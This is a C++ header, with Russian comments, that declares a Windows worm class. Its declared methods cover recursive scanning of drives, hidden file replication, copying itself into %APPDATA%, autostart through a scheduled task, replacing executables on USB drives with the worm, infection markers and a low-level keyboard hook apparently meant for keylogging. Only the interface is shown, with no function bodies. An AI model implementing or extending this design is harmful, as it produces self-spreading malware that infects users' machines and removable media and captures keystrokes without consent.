#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>

/**
 * @class worm
 * @brief Класс, реализующий логику самораспространения и мониторинга.
 * * Обеспечивает рекурсивное сканирование директорий, создание скрытых копий файлов,
 * автозагрузку и отслеживание подключения внешних накопителей.
 */
class worm
{
private:
    std::wstring path_to_start;           ///< Начальная директория для сканирования.
    std::vector<std::wstring> list_dir;   ///< Список найденных доступных директорий.
    std::vector<std::filesystem::path> file_to_copy; ///< Файлы для репликации.
    int iteration;                        ///< Количество копий на один файл.
    std::vector<std::filesystem::path> exe_on_the_flash_drive; ///< Список EXE на флешках.

public:
    /**
     * @brief Конструктор объекта worm.
     * @param path_to_start Путь старта (по умолчанию - папка запуска).
     * @param iteration Количество копий.
     */
    worm(const std::wstring& path_to_start = L"", int iteration = 2);

    /** @name Системный мониторинг */
    /**@{*/
    static worm* instance; ///< Статический указатель для доступа из WndProc.
    
    /**
     * @brief Запускает мониторинг устройств.
     * @param hInstance Дескриптор приложения.
     * @return Код завершения.
     */
    int run_device_monitor(HINSTANCE hInstance);
    /**@}*/

    /** @name Логика распространения */
    /**@{*/
    void scan_all_volumes();    ///< Сканирует локальные диски (DRIVE_FIXED).
    void search_list_dir();     ///< Рекурсивный поиск папок.
    void collect_visible_files(); ///< Сбор обычных файлов.
    void replicate_files();     ///< Создание скрытых копий.
    /**@}*/

    /** @name Закрепление в системе */
    /**@{*/
    void copy_and_hide_worm();  ///< Копирование в %APPDATA%.
    void create_scheduled_task(const std::wstring& worm_path); ///< Автозапуск.
    /**@}*/

    /** @name Работа со съемными носителями */
    /**@{*/
    void process_all_removable_disks(); ///< Замена EXE на флешках.
    void hide_and_replace_exe(const std::filesystem::path& target_exe, const std::wstring& worm_path);
    /**@}*/

    /** @name Вспомогательные проверки */
    /**@{*/
    bool possible_to_write(const std::wstring& dir_path); ///< Проверка прав записи.
    bool dir_was_infected(const std::wstring& dir_path);  ///< Проверка маркера.
    bool is_system_path(const std::wstring& path);       ///< Проверка на системную папку.
    /**@}*/

    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static HHOOK keyboardHook;
};